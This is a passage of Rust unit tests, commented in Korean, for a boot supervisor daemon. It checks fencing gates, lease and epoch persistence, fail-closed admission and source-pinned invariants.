            "아무도 부르지 않는 함수를 배선으로 읽었다"
        );
        // ★R8 ⓐ dead call — 호출자가 죽어 있으면 배선이 아니다. ★내 R7 합성 표본이 정확히
        //   이 형태였다(`t` 를 아무도 부르지 않는다): 양성 증거로 내세운 것이 실은 우회의
        //   예시였다(codex 지적 · 정확).
        let dead_caller = "fn reserve_admission() { do_work(); }\nfn t() { reserve_admission(); }";
        assert!(
            !wired("reserve_admission", dead_caller),
            "죽은 호출자(아무도 부르지 않는 t) 안의 호출을 배선으로 읽었다 — R7 판의 구멍이다"
        );
        // ★R8 ⓑ 자기재귀 — 자기가 자기를 부르는 것은 배선이 아니다.
        let self_recursive = "fn reserve_admission() { reserve_admission(); }";
        assert!(
            !wired("reserve_admission", self_recursive),
            "자기재귀를 호출로 셌다 — 스스로를 부르는 고립 함수가 통과한다"
        );
        // 살아있는 호출자(진입점)에서 불리면 배선이다 — 항상 적색인 사문이 아님을 함께 보인다.
        let fully_wired =
            "fn reserve_admission() { do_work(); }\nfn tick_in() { reserve_admission(); }";
        assert!(
            wired("reserve_admission", fully_wired),
            "정의·살아있는 호출·본문이 다 있는데 미배선으로 읽었다 — 항상 적색인 사문이다"
        );
        // ④ 합성 준비도 — 배선 없는 칸을 뒤집으면 정확히 그 칸이 적발된다.
        //    ★칸을 이름이 아니라 **값으로** 뒤집는다(R8 ⓒ): 이름→필드 조회가 사라졌으므로
        //      표에 오타가 나도 엉뚱한 칸을 읽는 별칭이 구조적으로 불가능하다.
        // ★admission_reserved·confirmed_exit_observed 는 여기서 뺀다 — B4-1·B4-2 착지로
        //   배선이 실재하므로 뒤집어도 결손이 아니다(lease_cas_closed 와 같은 자리).
        //   위 ② 에서 **양성**으로 잰다.
        let flips: [(&str, fn(&mut RunnerReadiness)); 5] = [
            ("atomic_handler", |r| r.atomic_handler = true),
            ("epoch_propagated", |r| r.epoch_propagated = true),
            ("self_terminate", |r| r.self_terminate = true),
            ("boot_last_writer", |r| r.boot_last_writer = true),
            ("durable_history", |r| r.durable_history = true),
        ];
        for (field, flip) in flips {
            let mut r = RUNNER_READINESS;
            flip(&mut r);
            assert_eq!(
                missing(r, &prod),
                vec![field],
                "{field} 를 배선 없이 참으로 주장했는데 통과했다 — 분리 배포가 열린다"
            );
        }
    }

    /// ★R5 [4] 소스핀 — 나이는 **삭제에 쓰이지 않는다**.
    ///
    /// 행위 검체만 있으면 누가 조건을 되살렸을 때 '고아를 안 넣는 형상' 에서는 조용히 초록일 수
    /// 있다. 나이 상수와 원장 축소가 **같은 줄에 오는 것 자체**를 금지해 형상과 무관하게 잡는다.
    #[test]
    fn age_is_a_diagnostic_axis_and_never_a_deletion_reason() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        for line in prod.lines() {
            assert!(
                !(line.contains("FENCED_REAP_AGE_SECS") && line.contains("retain(")),
                "나이가 다시 삭제 근거가 됐다({}) — 추정으로 지우면 살아 있는 러너를 없는 것으로 \
                 세어 새 런을 낳는다",
                line.trim()
            );
        }
        assert!(
            !prod.contains("retain(|f| now - f.at"),
            "나이 기반 원장 축소가 되살아났다(R5 [4] 회귀)"
        );
        assert_eq!(
            prod.matches("notify_orphan_hold_once(").count(),
            2,
            "고아 보유 통보의 정의 1 + 호출 1 이어야 한다 — 호출이 빠지면 정지가 조용해진다"
        );
        // ★R6 [3]: aged 전이 통보도 같은 계급이다(정의 1 + 호출 1).
        assert_eq!(
            prod.matches("notify_orphan_aged_once(").count(),
            2,
            "aged 전이 통보의 정의 1 + 호출 1 이어야 한다 — 빠지면 나이를 진단 축으로 남긴 의미가 사라진다"
        );
    }

    /// ★R3 #3(codex BLOCK) — 관측이 안 되면 **낳지 않는다**(fail-closed).
    ///
    /// 못 세는데 낳는 것이 이 축에서 가장 나쁜 실패다: 유계가 무너진 것을 아무도 모른다.
    /// Mutex 를 실제로 poison 시켜(락을 쥔 스레드가 패닉) 관측 불능 상태를 **결정론으로** 만든다.
    #[test]
    fn admission_is_fail_closed_when_the_table_cannot_be_observed() {
        let d = tmp_daemon("poison");
        let dir = tmp_spool("poison");
        enqueue_in(&dir, &req("p", None), 0.0).unwrap();
        // 고아 원장 Mutex 를 poison 한다 — 락을 쥔 채 패닉하면 이후 lock() 이 Err 다.
        let d2 = d.clone();
        let _ = std::thread::spawn(move || {
            let _g = d2.boot_fenced.lock().unwrap();
            panic!("의도적 poison");
        })
        .join();
        assert!(d.boot_fenced.lock().is_err(), "검체 자기검증: poison 이 걸리지 않았다");
        fn never(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            panic!("관측 불능인데 스폰했다 — 세지 못하는 상태에서 프로세스를 늘렸다");
        }
        let mut st = SupState::default();
        assert_eq!(
            tick_in(&d, &dir, &mut st, never, remove_spool_file, 1.0),
            0,
            "관측 불능에서 디스패치가 계상됐다"
        );
        // 조용하지 않아야 한다 — 부트가 안 나는 상태다.
        assert!(
            !d.feed_items.lock().unwrap().is_empty(),
            "관측 불능 정지가 조용하다"
        );
    }

    /// ★R3 #6(codex) — admission 상한에 걸려도 **시도 예산을 태우지 않는다**.
    ///
    /// 종전엔 attempts·generation 을 올려 영속한 **뒤** 상한을 봤다. 그러면 상한에 걸릴 때마다
    /// 예산만 소진되어 세 번이면 그 선언은 `attempts_exhausted` 로 **영영 뜨지 못한다** —
    /// 일시 정지가 조용히 종착이 되는 자리다.
    #[test]
    fn admission_cap_does_not_consume_the_attempt_budget() {
        let d = tmp_daemon("nobudget");
        let dir = tmp_spool("nobudget");
        enqueue_in(&dir, &req("b", None), 0.0).unwrap();
        {
            let mut g = d.boot_fenced.lock().unwrap();
            for i in 0..MAX_LIVE_BOOT_RUNS {
                g.push(crate::state::FencedRun {
                    intent: format!("o{i}"),
                    epoch: 0,
                    generation: 1,
                    pid: None,
                    why: "hb_stall",
                    at: 1.0,
                });
            }
        }
        fn never(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            panic!("상한인데 스폰했다");
        }
        let mut st = SupState::default();
        let mut now = 2.0;
        for _ in 0..MAX_ATTEMPTS + 2 {
            assert_eq!(tick_in(&d, &dir, &mut st, never, remove_spool_file, now), 0);
            now += 60.0;
        }
        // 디스크 예산도 메모리 예산도 오르지 않아야 한다.
        let left = BootIntent::from_str("b", &std::fs::read_to_string(intent_path(&dir, "b")).unwrap())
            .expect("상한 정지가 인텐트를 지웠다");
        assert_eq!(left.attempts, 0, "상한에 걸렸는데 디스크 시도 예산이 탔다");
        assert_eq!(left.generation, 0, "상한에 걸렸는데 lease 세대가 소비됐다");
        assert!(
            st.budget.get("b").is_none_or(|(n, _)| *n == 0),
            "상한에 걸렸는데 메모리 예산이 탔다"
        );
    }

    /// ★R3 #4(codex) — **2틱 음성 검체**: 한 번 fence 된 런은 다시 fence 되지 않는다.
    ///
    /// 재fence 는 고아 원장을 중복으로 채워 admission 분모를 부풀리고, 그러면 부트가 이유 없이
    /// 멈춘다. 원자 이동(활성 표에서 뺀다)과 유일 키(intent·epoch·generation) 둘이 함께 막는다.
    #[test]
    fn a_fenced_run_is_not_fenced_again_on_the_next_tick() {
        let d = tmp_daemon("refence");
        let dir = tmp_spool("refence");
        enqueue_in(&dir, &req("r", None), 0.0).unwrap();
        let mut st = SupState::default();
        st.fence_armed = true;
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        {
            let mut g = d.boot_run_active.lock().unwrap();
            g.values_mut().next().unwrap().hb = 10.0;
        }
        let t = 10.0 + HB_STALL_SECS + 1.0;
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, t);
        assert_eq!(d.boot_fenced.lock().unwrap().len(), 1, "1틱: 고아 1건이 아니다");
        // ── 2틱: 같은 런을 다시 fence 하지 않는다 ──
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, t + 60.0);
        assert_eq!(
            d.boot_fenced.lock().unwrap().len(),
            1,
            "2틱에 재fence 됐다 — 원장이 중복돼 admission 분모가 부푼다"
        );
        let after = BootIntent::from_str("r", &std::fs::read_to_string(intent_path(&dir, "r")).unwrap())
            .expect("판독 불가");
        assert_eq!(after.generation, 2, "2틱에 세대가 또 올랐다");
    }

    /// ★R3 #7(codex BLOCK · master 심판) — **무장 전에는 fence 가 전면 봉인된다.**
    ///
    /// 이 검체가 지키는 것: hb 가 끊긴 런이 있어도 무장하지 않으면 **세대가 오르지 않고**
    /// 고아 원장에도 들어가지 않는다. 그리고 그 정지는 조용하지 않다(미무장 고지 1회).
    ///
    /// 왜 데이터 조건이 아니라 게이트인가: 종전의 `hb <= started` 는 데이터가 바뀌면 **조용히
    /// 열린다** — 러너가 hb 를 한 번이라도 쓰기 시작하는 순간 무장 여부와 무관하게 fence 가
    /// 살아난다. 게이트는 그 우연을 막는다.
    #[test]
    fn fence_is_sealed_until_armed() {
        let d = tmp_daemon("disarmed");
        let dir = tmp_spool("disarmed");
        enqueue_in(&dir, &req("s", None), 0.0).unwrap();
        let mut st = SupState::default();
        assert!(!st.fence_armed, "기본값이 무장이면 봉인이 아니다");
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        {
            let mut g = d.boot_run_active.lock().unwrap();
            g.values_mut().next().unwrap().hb = 10.0; // 보고 1회 = hb 가드는 통과하는 상태
        }
        let before = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 10.0 + HB_STALL_SECS + 1.0);
        let after = BootIntent::from_str("s", &std::fs::read_to_string(intent_path(&dir, "s")).unwrap())
            .expect("판독 불가");
        assert_eq!(after.generation, 1, "미무장인데 세대가 올랐다 — 봉인이 뚫렸다");
        assert!(
            d.boot_fenced.lock().unwrap().is_empty(),
            "미무장인데 고아 원장에 기록됐다"
        );
        assert!(
            d.bus.latest_seq() > before,
            "미무장 정지가 조용하다 — 안 하기로 정한 것과 그냥 안 하는 것은 다르다"
        );
    }

    /// ★R3 #7 — 무장 판독은 **켜는 쪽만 명시적**이다(오타 하나로 위험 경로가 열리면 안 된다).
    #[test]
    fn fence_arm_switch_defaults_to_off() {
        assert!(!env_asks_arm(None), "미설정이 무장이면 안 된다");
        assert!(!env_asks_arm(Some("")), "빈 값이 무장이면 안 된다");
        assert!(!env_asks_arm(Some("0")), "0 이 무장이면 안 된다");
        assert!(!env_asks_arm(Some("yes")), "미지값이 무장이면 안 된다(켜는 쪽만 명시적)");
        assert!(env_asks_arm(Some("1")));
        assert!(env_asks_arm(Some("true")));
        assert!(env_asks_arm(Some(" 1 ")), "공백은 다듬어 받는다");
    }

    /// ★R4 [4](codex · master 심판) — 무장은 **의도 AND 능력**이다.
    ///
    /// gemini 가 R3 에서 놓친 지점이 정확히 이것이다: env 스위치 하나로 arm 되면, CAS 폐쇄면도
    /// 자가종료도 없는 빌드에서 환경변수를 켜는 것만으로 fence 가 살아난다. 그 창에서 세대를
    /// 올려봐야 거절을 집행할 주체가 없으니 막은 것 없이 표와 파일만 흔든다.
    #[test]
    fn arming_requires_both_the_env_and_a_ready_build() {
        let none = RunnerReadiness {
            lease_cas_closed: false,
            atomic_handler: false,
            epoch_propagated: false,
            self_terminate: false,
            boot_last_writer: false,
            durable_history: false,
            admission_reserved: false,
            confirmed_exit_observed: false,
        };
        let all = RunnerReadiness {
            lease_cas_closed: true,
            atomic_handler: true,
            epoch_propagated: true,
            self_terminate: true,
            boot_last_writer: true,
            durable_history: true,
            admission_reserved: true,
            confirmed_exit_observed: true,
        };
        // ① env 만으로는 안 된다 — 이 검체가 R3 [4] 그 자체다.
        assert!(
            !fence_armed_from(Some("1"), none),
            "env 만으로 무장했다 — 능력 없는 빌드에서 fence 가 살아난다(R3 [4] 재발)"
        );
        // ② 한 칸만 비어도 안 된다(AND 는 전칭이다).
        for hole in 0..8 {
            let mut r = all;
            match hole {
                0 => r.lease_cas_closed = false,
                1 => r.atomic_handler = false,
                2 => r.epoch_propagated = false,
                3 => r.self_terminate = false,
                4 => r.boot_last_writer = false,
                5 => r.durable_history = false,
                // ★R5 [5]: 이 둘이 B4 전제를 게이트한다 — admission 예약과 exit 관측이 없으면
                //   fence 는 유계를 세지도, 고아를 회수하지도 못한 채 세대만 올린다.
                6 => r.admission_reserved = false,
                _ => r.confirmed_exit_observed = false,
            }
            assert!(
                !fence_armed_from(Some("1"), r),
                "칸 하나가 비었는데 무장했다({:?}) — AND 가 OR 로 무너졌다",
                r.missing()
            );
            assert_eq!(r.missing().len(), 1, "빠진 칸을 정확히 지목하지 못한다");
        }
        // ③ 능력만으로도 안 된다 — 운영자가 켜지 않은 것을 대신 켜지 않는다.
        assert!(!fence_armed_from(None, all), "env 없이 무장했다");
        // ④ 둘 다 참이면 무장한다(AND 가 항상 false 인 사문이 아님을 함께 잰다).
        assert!(fence_armed_from(Some("1"), all), "둘 다 참인데 무장하지 않았다");
        // ⑤ ★이 빌드의 실제 준비도는 아직 false 다(B4 전) — 봉인이 실재함을 못 박는다.
        assert!(
            !RUNNER_READINESS.ready(),
            "빌드 준비도가 true 다 — B4 계약이 착지했는가? 아니라면 봉인이 뚫린 것이다"
        );
        assert_eq!(
            RUNNER_READINESS.missing().len(),
            8,
            "준비도 칸이 이유 없이 뒤집혔다: {:?}",
            RUNNER_READINESS.missing()
        );
    }

    /// ★R4 [4] 소스핀 — 무장 판정이 **한 지점**이고 그 지점이 readiness 를 AND 한다.
    ///
    /// 순수 함수만 옳고 호출부가 `env_asks_arm` 을 직접 대입하면 검체는 초록인데 프로덕션은
    /// env 단독으로 arm 된다(공허 통과). 판정 지점을 닫힌 집합으로 못 박는다.
    #[test]
    fn arming_is_decided_at_exactly_one_place_that_ands_readiness() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        assert_eq!(
            prod.matches("st.fence_armed = ").count(),
            1,
            "무장 대입 지점이 1곳이 아니다 — 판정이 갈라지면 한쪽만 readiness 를 본다"
        );
        assert!(
            prod.contains("st.fence_armed = fence_armed_from(arm_req.as_deref(), RUNNER_READINESS)"),
            "무장 대입이 readiness 를 AND 하는 판정을 거치지 않는다(env 단독 무장 재발)"
        );
        let at = prod.find("pub fn fence_armed_from(").expect("fence_armed_from 소실");
        let body = &prod[at..];
        let body = &body[..body.find("\n}").expect("fence_armed_from 본문 끝 소실")];
        assert!(
            body.contains("readiness.ready()") && body.contains("&&"),
            "무장 판정이 readiness 를 AND 하지 않는다: {body:?}"
        );
    }

    /// ★R4 [1] 소스핀 — epoch 영속의 **세 계약**(O_EXCL · fsync · 원자 교체)과 순서, 그리고
    /// **카운터로의 회귀 금지**를 코드에서 직접 확인한다.
    ///
    /// 행위 검체로는 fsync 유무를 가를 수 없다(크래시를 일으켜야 갈린다). 그래서 이 축만
    /// 소스로 못 박는다 — 재는 척하는 행위 검체보다 정직하다.
    #[test]
    fn epoch_persist_is_atomic_synced_and_never_a_saturating_counter() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn persist_epoch(").expect("persist_epoch 소실");
        let body = &prod[at..];
        let body = &body[..body.find("\n}").expect("persist_epoch 본문 끝 소실")];
        for (needle, why) in [
            ("create_new(true)", "tmp 를 O_EXCL 로 열지 않는다 — 남의 tmp 를 덮어쓸 수 있다"),
            ("sync_all()", "fsync 가 없다 — rename 은 성공했는데 내용이 비는 창이 열린다"),
            ("rename(", "원자 교체가 아니다 — 제자리 쓰기는 판독자에게 찢긴 파일을 보인다"),
        ] {
            assert!(body.contains(needle), "persist_epoch 에 {needle} 이 없다: {why}");
        }
        assert!(
            body.find("sync_all()").unwrap() < body.find("rename(").unwrap(),
            "fsync 가 rename 뒤로 갔다 — 그 순서면 크래시 창이 그대로 남는다"
        );
        // ★카운터 회귀 차단: epoch 는 더하지 않는다. 더하는 순간 천장에서 조용히 멈추고,
        //   그때부터 모든 재시작이 같은 값을 돌려주어 ABA 가 다시 열린다.
        let bat = prod.find("pub fn bump_boot_epoch(").expect("bump_boot_epoch 소실");
        let bbody = &prod[bat..];
        let bbody = &bbody[..bbody.find("\n}").expect("bump_boot_epoch 본문 끝 소실")];
        for bad in ["saturating_add", "checked_add", "wrapping_add"] {
            assert!(
                !bbody.contains(bad),
                "epoch 가 다시 카운터가 됐다({bad}) — 천장·경주 둘 다 되살아난다"
            );
        }
    }

    /// ★R4 [1]·[6] — **영속 실패는 삼켜지지 않는다.**
    ///
    /// 종전 코드는 `let _ = std::fs::write(..)` 였다. 그러면 디스크에 아무것도 없는 채로
    /// 감독자가 열리고, 다음 재시작은 '이전 값' 을 몰라 재사용 방지가 사라진다.
    #[cfg(unix)]
    #[test]
    fn epoch_persist_failure_is_reported_not_swallowed() {
        use std::os::unix::fs::PermissionsExt;
        let d = std::env::temp_dir().join(format!("cysd-epoch-ro-{:x}", epoch_nonce()));
        std::fs::create_dir_all(&d).unwrap();
        // 이름을 예측하는 결함 주입이 아니라 **권한**으로 막는다(A-M4 교훈: 이름 주입은
        // tmp 가 유일해지는 순간 무력화된다).
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o555)).unwrap();
        // ★검체 자기검증 — 이 환경에서 권한 주입이 실제로 듣는가(root 면 안 듣는다).
        //   안 들으면 이 검체는 아무것도 재지 못한다. 그 무측정을 조용히 통과시키지 않는다.
        let injection_works = std::fs::File::create(d.join("probe")).is_err();
        let r = bump_boot_epoch(&d);
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::remove_dir_all(&d).ok();
        assert!(
            injection_works,
            "권한 주입이 듣지 않는 환경이다(root 의심) — 이 검체는 무측정이고, 무측정은 통과가 아니다"
        );
        assert!(
            r.is_err(),
            "영속 실패를 삼켰다 — lease identity 의 근거 없이 감독자가 열린다"
        );
    }

    /// ★R4 [1]·[6] — **동시 기동이 같은 epoch 를 내지 않는다.**
    ///
    /// 종전은 파일을 읽어 +1 하는 RMW 라 프로세스 간 잠금을 요구했다. unix 는 데몬 startup
    /// flock 이 그것을 주지만 그 함수는 `#[cfg(unix)]` 라 **Windows 에는 없다**. nonce 는
    /// 잠금 없이도 겹치지 않는다 — 이 검체가 그 성질을 직접 잰다(스레드는 프로세스 간 경주의
    /// 하한 모형이다: 같은 pid·같은 순간이라 조건이 오히려 더 가혹하다).
    #[test]
    fn concurrent_epoch_bumps_never_collide() {
        let d = std::env::temp_dir().join(format!("cysd-epoch-conc-{:x}", epoch_nonce()));
        std::fs::create_dir_all(&d).unwrap();
        const N: usize = 16;
        let hs: Vec<_> = (0..N)
            .map(|_| {
                let d = d.clone();
                std::thread::spawn(move || bump_boot_epoch(&d))
            })
            .collect();
        let vals: Vec<u64> = hs
            .into_iter()
            .map(|h| h.join().expect("스레드 패닉").expect("동시 bump 가 실패했다"))
            .collect();
        std::fs::remove_dir_all(&d).ok();
        let uniq: std::collections::HashSet<u64> = vals.iter().copied().collect();
        assert_eq!(
            uniq.len(),
            N,
            "동시 bump 가 같은 epoch 를 냈다 — 잠금 없는 RMW 의 재발이다: {vals:?}"
        );
    }

    /// ★R5 [3] — **이미 목적지가 있는 상태**에서의 동시 기동.
    ///
    /// 현행 동시 검체는 빈 디렉터리에서 시작하므로 첫 rename 이 '없는 목적지 만들기' 다. Windows
    /// 에서 문제가 되는 것은 그쪽이 아니라 **덮어쓰기**이고, 게다가 다른 데몬이 그 파일을 읽는
    /// 중일 수 있다. 그 조합을 직접 만든다.
    ///
    /// 실측 근거(rust-src): `MoveFileExW(.., MOVEFILE_REPLACE_EXISTING)` 가 덮어쓰고, 기본
    /// `share_mode` 에 `FILE_SHARE_DELETE` 가 있어 읽는 핸들이 rename 을 막지 않는다. 이 검체는
    /// 그 두 사실이 **이 코드 경로에서도 성립하는지**를 잰다(문서를 믿지 않고 잰다).
    #[test]
    fn concurrent_bumps_over_an_existing_destination_all_succeed() {
        let d = std::env::temp_dir().join(format!("cysd-epoch-ovr-{:x}", epoch_nonce()));
        std::fs::create_dir_all(&d).unwrap();
        // 목적지를 먼저 만든다 — 이제 모든 동시 bump 가 replace 경로를 탄다.
        let seed = bump_boot_epoch(&d).expect("seed bump 실패");
        assert!(d.join("boot-epoch").exists(), "seed 가 목적지를 만들지 못했다");
        const N: usize = 12;
        let hs: Vec<_> = (0..N)
            .map(|_| {
                let d = d.clone();
                std::thread::spawn(move || {
                    // 절반은 **읽는 중**인 상태를 만든다 — 읽는 핸들이 rename 을 막으면 여기서 터진다.
                    let _peek = std::fs::read_to_string(d.join("boot-epoch"));
                    bump_boot_epoch(&d)
                })
            })
            .collect();
        let vals: Vec<u64> = hs
            .into_iter()
            .map(|h| h.join().expect("스레드 패닉").expect("기존 목적지 위 replace 가 실패했다"))
            .collect();
        let on_disk: u64 = std::fs::read_to_string(d.join("boot-epoch"))
            .expect("목적지가 사라졌다 — remove 후 rename 으로 바뀌었는가")
            .trim()
            .parse()
            .expect("목적지가 수치가 아니다(찢긴 쓰기)");
        let leftovers = std::fs::read_dir(&d)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy() != "boot-epoch")
            .count();
        std::fs::remove_dir_all(&d).ok();
        let uniq: std::collections::HashSet<u64> = vals.iter().copied().collect();
        assert_eq!(uniq.len(), N, "동시 replace 가 같은 epoch 를 냈다: {vals:?}");
        assert!(!vals.contains(&seed), "seed 값이 재사용됐다 — 직전 값 회피가 무너졌다");
        assert!(
            vals.contains(&on_disk),
            "디스크 값이 어느 쓰기의 것도 아니다 — 찢긴 교체다(원자성 붕괴)"
        );
        assert_eq!(leftovers, 0, "tmp 잔해가 남았다");
    }

    /// ★R5 [3] 소스핀 — **목적지를 먼저 지우고 rename 하지 않는다.**
    ///
    /// "Windows 는 덮어쓰기 rename 이 안 된다" 는 통념으로 누가 remove+rename 으로 '고치면'
    /// 그 순간 원자성이 깨진다: 목적지가 잠깐 사라지고, 그 창에서 크래시하면 epoch 를 통째로
    /// 잃는다(다음 기동이 이전 값을 몰라 재사용 방지가 사라진다). 실측으로 그럴 필요가 없음이
    /// 확인됐으므로(MoveFileExW REPLACE_EXISTING), 지금 옳은 것을 **지키는** 핀을 세운다.
    #[test]
    fn epoch_persist_never_deletes_the_destination_before_renaming() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn persist_epoch(").expect("persist_epoch 소실");
        let body = &prod[at..];
        let body = &body[..body.find("\n}").expect("persist_epoch 본문 끝 소실")];
        // 이 함수의 모든 삭제는 **자기 tmp** 에만 향한다.
        assert_eq!(
            body.matches("remove_file(&tmp)").count(),
            body.matches("remove_file(").count(),
            "persist_epoch 이 tmp 아닌 것을 지운다 — 목적지 선삭제는 원자 교체를 깬다"
        );
        assert!(
            !body.contains("remove_file(path)") && !body.contains("remove_file(&path)"),
            "목적지 선삭제가 들어왔다 — 크래시 창에서 epoch 를 통째로 잃는다"
        );
        assert!(
            body.contains("std::fs::rename(&tmp, path)"),
            "원자 교체가 사라졌다(MoveFileExW REPLACE_EXISTING 경로)"
        );
    }

    /// ★R4 [1]·[6] — **연속 기동은 매번 다른 epoch 를 내고, 최신값이 디스크에 남는다.**
    /// tmp 잔해가 남지 않는 것도 함께 잰다(A13 규약 — 자기 것만 치운다).
    #[test]
    fn successive_epochs_differ_and_the_latest_is_on_disk() {
        let d = std::env::temp_dir().join(format!("cysd-epoch-seq-{:x}", epoch_nonce()));
        std::fs::create_dir_all(&d).unwrap();
        let a = bump_boot_epoch(&d).expect("첫 bump 실패");
        // ★R5 [3]: 둘째 bump 는 **이미 있는 목적지 위로** 덮어쓴다. 그 사전 조건을 명시로
        //   단언해야 이 검체가 Windows 의 replace 경로(MoveFileExW REPLACE_EXISTING)를 실제로
        //   밟는다는 것이 문서가 아니라 측정이 된다. 없으면 '어차피 없던 파일을 만드는' 경로만
        //   재고도 초록이다.
        assert!(
            d.join("boot-epoch").exists(),
            "첫 bump 뒤 목적지가 없다 — 덮어쓰기 경로를 재지 못한다(검체 자기검증)"
        );
        let b = bump_boot_epoch(&d).expect("둘째 bump 실패 — 기존 목적지 위 replace 가 막혔다");
        let on_disk: u64 = std::fs::read_to_string(d.join("boot-epoch"))
            .expect("epoch 파일 부재")
            .trim()
            .parse()
            .expect("epoch 파일이 수치가 아니다");
        let leftovers: Vec<String> = std::fs::read_dir(&d)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n != "boot-epoch")
            .collect();
        std::fs::remove_dir_all(&d).ok();
        assert_ne!(a, b, "연속 기동이 같은 epoch 를 냈다 — 재시작 간 ABA 가 열린다");
        assert_eq!(on_disk, b, "디스크에 최신 epoch 가 없다 — 다음 기동이 재사용을 못 피한다");
        assert!(leftovers.is_empty(), "tmp 잔해가 남았다: {leftovers:?}");
    }

    /// ★B3-4(T3-1) — **선택적** lease 검증의 네 갈래.
    ///
    /// ①이 계약의 핵심이다: 안 실으면 종전 그대로 통과한다. 이것을 필수로 바꾸면
    /// `surface.create` 를 부르는 사람·GUI·다른 노드가 전부 막힌다(추가만 한다는 계약).
    #[test]
    fn optional_lease_only_checks_when_supplied() {
        let run = |generation: u32| BootRunActive {
            intent: "i".into(),
            generation,
            roles: Vec::new(),
            hb: 1.0,
            progress_step: String::new(),
            progress_at: 1.0,
            started: 1.0,
            pid: None,
            epoch: 1,
        };
        let active = run(7);
        // ① 미제출 — 종전 경로. 활성 런이 있든 없든 통과한다.
        assert!(lease_ok(None, Some(&active)), "lease 를 안 실은 호출을 막았다 — 추가만 계약 위반");
        assert!(lease_ok(None, None), "활성 런이 없을 때도 종전 호출은 통과해야 한다");
        // ② 일치 — 통과.
        assert!(lease_ok(Some(7), Some(&active)), "일치하는 lease 를 거절했다");
        // ③ 불일치(fence 로 세대가 오른 뒤 도착한 구 러너) — 거절.
        assert!(
            !lease_ok(Some(6), Some(&active)),
            "구 세대 lease 를 통과시켰다 — fence 가 회수했다고 믿은 소유권이 계속 쓰인다"
        );
        // ④ 활성 런이 없는데 lease 를 실었다 — 거절(대조할 소유권이 없다).
        assert!(
            !lease_ok(Some(7), None),
            "소유권 표가 비었는데 lease 를 통과시켰다 — 대조 없는 통과다"
        );
    }

    /// ★B3-2R ③(codex③) — fence 의 **CAS 술어**를 직접 잰다.
    ///
    /// ★배선 검체로 만들려던 첫 시도는 **공허했다**(변이로 적발했다): 표와 스냅샷의 세대가
    /// 이미 일치해야 fence 판정이 나므로, 그 상태에서 디스크만 따로 움직이는 상황을 틱 밖에서
    /// 만들 수 없다. 그렇게 만든 검체는 CAS 를 무력화해도 초록이었다 — 판정이 앞단 필터에서
    /// 이미 걸렸기 때문이다. 그래서 판정을 순수 함수로 뽑아 값으로 잰다.
    #[test]
    fn fence_cas_rejects_anything_but_the_expected_shape() {
        let base = BootIntent::from_str(
            "x",
            &format!(
                r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":1,
                    "created_at":0.0,"attempts":1,"next_attempt_at":0.0,"reason":"t",
                    "generation":3,"state":"running"}}"#
            ),
        )
        .expect("검체 자기검증: 인텐트 판독 실패");
        assert!(fence_cas_ok(Some(&base), 3), "기대 형상인데 CAS 가 막았다");
        assert!(!fence_cas_ok(Some(&base), 4), "세대가 달라졌는데 통과시켰다 — 이중 재개 경로");
        let mut done = base.clone();
        done.state = IntentState::Terminal;
        assert!(
            !fence_cas_ok(Some(&done), 3),
            "이미 terminal 인 런을 fence 하려 한다 — 완료와 fence 가 겹치면 이중 재개가 된다"
        );
        let mut pending = base.clone();
        pending.state = IntentState::Pending;
        assert!(!fence_cas_ok(Some(&pending), 3), "running 이 아닌 런을 fence 하려 한다");
        assert!(
            !fence_cas_ok(None, 3),
            "판독 실패를 일치로 읽었다 — 읽을 수 없는 파일에 기대 상태를 가정하면 안 된다"
        );
    }

    /// ★B3-2R ④ⓑ — 성공 스폰의 pid 가 표에 실린다(**관측용** · 종료용 아님).
    #[test]
    fn active_table_carries_the_spawned_pid() {
        let d = tmp_daemon("pid");
        let dir = tmp_spool("pid");
        enqueue_in(&dir, &req("q", None), 0.0).unwrap();
        fn pid_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            Ok("pid=4242".into())
        }
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, pid_runner, remove_spool_file, 1.0), 1);
        assert_eq!(
            d.boot_run_active.lock().unwrap().values().next().unwrap().pid,
            Some(4242),
            "표에 pid 가 실리지 않았다 — 고아가 생겨도 찾아갈 수 없다"
        );
    }

    /// ★B3 — 미보고 런은 실제 틱에서도 fence 되지 않는다(순수 함수 단언의 배선 확인).
    #[test]
    fn never_reported_run_is_not_fenced_in_the_tick_path() {
        let d = tmp_daemon("nofence");
        let dir = tmp_spool("nofence");
        enqueue_in(&dir, &req("n", None), 0.0).unwrap();
        let mut st = SupState::default();
        // ★무장한다 — 그래야 이 검체가 재는 것이 **hb 가드**이지 무장 게이트가 아니다.
        //   무장 안 하면 어느 쪽이 막았는지 구별되지 않아 공허한 통과가 된다.
        st.fence_armed = true;
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        // hb 를 건드리지 않는다 = 한 번도 보고하지 않은 런.
